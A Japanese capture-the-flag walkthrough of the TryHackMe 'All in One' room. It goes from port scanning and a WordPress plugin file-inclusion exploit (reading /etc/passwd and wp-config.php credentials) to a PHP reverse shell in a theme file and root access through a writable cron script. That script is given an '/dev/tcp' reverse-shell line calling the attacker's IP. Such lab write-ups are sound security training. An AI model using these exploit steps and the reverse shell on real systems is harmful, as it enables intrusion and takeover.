# All in One CTF

https://tryhackme.com/room/allinonemj

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.193.151
root@ip-10-10-147-133:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-15 07:31 GMT
Nmap scan report for 10.10.193.151
Host is up (0.00021s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:54:DE:EC:2F:41 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.56 seconds
root@ip-10-10-147-133:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-15 07:31 GMT
Nmap scan report for 10.10.193.151
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:54:DE:EC:2F:41 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds
```

FTP, SSH, HTTP

### gobuster

```shell
# attack box
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

# kali
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
```

```shell
gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30

===============================================================
/.php                 (Status: 403) [Size: 278]
/hackathons           (Status: 200) [Size: 197]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.193.151/wordpress/]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

### http://10.10.193.151/hackathons

```html
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

ユーザー名とパスワードか？

```shell
$ ftp 10.10.193.151
Connected to 10.10.193.151.
220 (vsFTPd 3.0.3)
Name (10.10.193.151:kali): Dvc
530 This FTP server is anonymous only.
```

FTPユーザーではない。SSHでもなかった。

### http://10.10.193.151/wordpress

wpサイトが表示される。

ユーザー名：Dvc でログインしようとしたら「Unknown username」と表示された。  
elyana ユーザーは存在する。

nuclei でスキャン。

```shell
$ nuclei -target http://10.10.193.151/wordpress/

[CVE-2023-48795] [javascript] [medium] 10.10.193.151:22 ["Vulnerable to Terrapin"]

[CVE-2016-10956] [http] [high] http://10.10.193.151/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

[CVE-2016-10956] [http] [high] http://10.10.193.151/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
```


ファイルインクルージョンの脆弱性がある。

/etc/passwd

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
mysql:x:110:113:MySQ Server,,,:/nonexistent:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

wp-config.php
```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
```

DBと同じパスワードでWordPressにログインできた。

### wordpress

コメントに下記の文字列があった。

```text
2uLSK23LI8a2lpFUCCiw9Ng88np
```

```html
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

と合わせて、２つの謎が未解決。

### Vegenere 暗号

後者は、Vegenere暗号。  
https://www.dcode.fr/vigenere-cipher

KeepGoingをキーとして復号すると下記になる。  
wp-config.php で発見済のパスワードと同じ。

```text
Try H@ckme@123
```

### リバースシェル

404.php の編集画面に遷移できないと思っていたが、Theme Editor の 右側から選択できることに気づいた。  
PHPリバースシェルに書き換える。

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.193.151] 50608
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:04:04 up  3:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

シェル取得成功。

## 権限昇格１

```shell
bash-4.4$ ls /home
elyana
bash-4.4$ ls -al /home/elyana
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
drwxr-xr-x 3 root   root   4096 Oct  5  2020 ..
-rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
bash-4.4$ cat /home/elyana/hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

Elyanaのパスワードがどこかに隠されているらしい。

それとは関係なく backups ディレクトリを発見したので調べる。

```shell
bash-4.4$ ls -al /var/backups      
total 52
drwxr-xr-x  2 root root  4096 Oct  7  2020 .
drwxr-xr-x 14 root root  4096 Oct  5  2020 ..
-rw-r--r--  1 root root 32890 Oct  6  2020 apt.extended_states.0
-rw-r--r--  1 root root  3570 Oct  5  2020 apt.extended_states.1.gz
-rwxrwxrwx  1 root root    73 Oct  7  2020 script.sh
bash-4.4$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task 
bash-4.4$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh
```

/var/backups/script.sh を毎分rootが実行しており、そのスクリプトを編集可能。  
リバースシェルを仕込む。

```shell
bash-4.4$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task 
sh -i >& /dev/tcp/10.2.22.182/5555 0>&1
```

rootシェル取得成功。

```shell
$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.193.151] 33812
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
# cat /home/elyana/user.txt
VEhNe.............................................
# cat /root/root.txt
VEhNe.............................................
```

それぞれBase64デコードし、フラグゲット！

## 振り返り

- wp-config.php にDB接続情報があると覚えたのでログインするまではスムーズだった。
- Theme Editor で 404.php を選択できることに気づかなかったため時間がかかった。

## Tags

#tags:WordPress
